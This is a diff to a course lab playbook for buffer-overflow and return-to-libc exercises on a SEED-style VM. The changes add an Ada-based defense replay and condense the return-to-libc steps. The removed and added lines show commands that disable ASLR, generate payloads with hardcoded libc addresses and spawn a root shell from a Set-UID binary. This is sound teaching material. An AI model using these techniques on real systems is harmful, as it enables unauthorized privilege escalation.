@@ -1,6 +1,6 @@
-# CEG4799/CSI4539 Lab 2 - Track 1 Demo Playbook (E1/T1 -> E5/T5 + E9/T8)
+# CEG4799/CSI4539 Lab 2 - Track 1 Demo Playbook (E1/T1 -> E5/T5 + E7/T7 + E9/T8)
 # Working directory for all commands unless stated otherwise:
-cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+cd /home/seed/Documents/Laboratoire_CSI4539
 
 # -----------------------------
 # 0) Baseline setup and checks
@@ -60,10 +60,13 @@ readlink -f /bin/sh
 # E3/T3 - Level 1
 # ----------------
 # Position for E3/T3 commands:
-cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+cd /home/seed/Documents/Laboratoire_CSI4539/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
 
 # Generate Level-1 payload (offset=112, ret calibrated for this VM).
 python3 exploit.py
+
+# Preserve the exact T3 input for the later E7 replay before other tests replace badfile.
+cp badfile badfile-t3
 
 # Quick payload sanity check: return address bytes at offset 112.
 xxd -g1 -s 112 -l 4 badfile
@@ -171,50 +174,31 @@ printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1-nx
 # ----------------
 # E5/T5 - Return-to-libc (retlib.c)
 # ----------------
-# Position for E5/T5 commands:
-cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Return_to_Libc_Labsetup/Labsetup
+# Run the current E5 script. It builds retlib/prtenv, gets the runtime addresses,
+# generates badfile with exploit_script.py, and launches retlib.
+cd /home/seed/Documents/Laboratoire_CSI4539/lab2/Return_to_Libc_Labsetup
+mkdir -p ../traces
+script -q -c "./T5.sh" ../traces/T5-retlib.log
 
-# Build retlib (32-bit, NX enabled, no canary, Set-UID root).
-make clean
-make
-ls -l retlib
-file retlib
+# In the spawned shell, run /usr/bin/id and then exit.
+# Acceptance check: id must report euid=0(root); otherwise E5 has not passed.
+# The trace records the addresses and interactive result without committing binaries.
 
-# Baseline controls for reproducibility.
-sudo sysctl -w kernel.randomize_va_space=0
-sudo ln -sf /bin/zsh /bin/sh
-readlink -f /bin/sh
 
-# Provide command string used by system().
-export MYSH=/bin/sh
+# ----------------
+# E7/T7 - Ada defense
+# ----------------
+# Reuse the exact Level-1 T3 input saved above as badfile-t3.
+cd /home/seed/Documents/Laboratoire_CSI4539/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+test -s badfile-t3
 
-# Measure current /bin/sh string address in this same shell environment.
-./prtenv
+# Build the Ada defense and capture the replay result.
+mkdir -p obj ../../../traces
+gprbuild -P lab2_defense.gpr
+./main badfile-t3 | tee ../../../traces/T7-ada.log
 
-# Generate badfile using:
-# Y=28 (overwrite saved return with system),
-# Z=32 (return from system to exit),
-# X=36 (argument to system -> /bin/sh address from prtenv).
-# system() and exit() addresses are from this VM/libc with ASLR off.
-python3 exploit_gen.py --sh "$(./prtenv | awk '/MYSH address/{print $3}')" --system 0xf7e0a360 --exit 0xf7dfcec0
-xxd -g4 -l 48 badfile
-
-# Run return-to-libc attack.
-# Expected: euid=0(root) from id, without executing injected stack code.
-printf '/usr/bin/id\nexit\n' | ./retlib
-
-# Variation A (is exit needed?): set exit address to 0 and rerun.
-# Expected: shell may still spawn, but post-shell return is less stable.
-
-# Variation B (rename effect): changing binary name shifts environment addresses.
-# Recompute MYSH with a same-shell helper and regenerate badfile before rerunning.
-# Example:
-#   cp retlib retlib2
-#   cp prtenv prtenv2
-#   export MYSH=/bin/sh
-#   ./prtenv2
-#   python3 exploit_gen.py --sh <new_addr> --system 0xf7e0a360 --exit 0xf7dfcec0
-#   printf '/usr/bin/id\nexit\n' | ./retlib2
+# Expected: Constraint_Error is caught and the oversized T3 input is rejected safely.
+# Do not substitute the A*517 smoke-test file; E7 requires the same input as T3.
 
 
 # -------------------------------------------
